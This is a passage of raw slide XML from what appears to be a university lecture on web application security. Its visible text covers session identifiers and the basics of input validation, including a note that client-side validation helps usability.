                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>SID=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10" b="1">
                          <a:solidFill>
                            <a:srgbClr val="D70031"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>31</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Calibri"/>
                        <a:cs typeface="Calibri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560"/>
                        </a:spcBef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L="1290320">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Attacker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B="0" marT="69215">
                    <a:lnL w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnB w="19050">
                      <a:solidFill>
                        <a:srgbClr val="00252F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</a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="object 29" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="6427114"/>
            <a:ext cx="769429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solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security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30" name="object 30" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11049761" y="6427114"/>
            <a:ext cx="18097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25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>39</a:t>
            </a:r>
            <a:endParaRPr sz="1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962050" y="2675966"/>
            <a:ext cx="6405245" cy="1416050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="95250" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12700" marR="5080">
              <a:lnSpc>
                <a:spcPts val="5190"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-165" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>INSUFFICIENT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-145" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-85" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>INPUT </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t>VALIDATION</a:t>
            </a:r>
            <a:endParaRPr sz="4800">
              <a:latin typeface="Tahoma"/>
              <a:cs typeface="Tahoma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4117975" y="6335674"/>
            <a:ext cx="3897629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solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Federico </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security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11049761" y="6427114"/>
            <a:ext cx="18097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25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>40</a:t>
            </a:r>
            <a:endParaRPr sz="1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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>41</a:t>
            </a:fld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62050" y="557529"/>
            <a:ext cx="4563110" cy="57404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10"/>
              <a:t>INPUT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-254"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>VALIDATION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3" descr="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60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Proper</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>validation</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>great</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>part</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ensuring</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>integrity</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t>a </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>application</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Client-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>side</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>validation</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>great</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>practice</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>usability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="234"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Errors</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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are</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>presented</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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soon</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>possibile</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="349885" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1030"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t>However,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>client-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>side</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>validation</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>also</a:t>
            </a:r>
            <a:r>
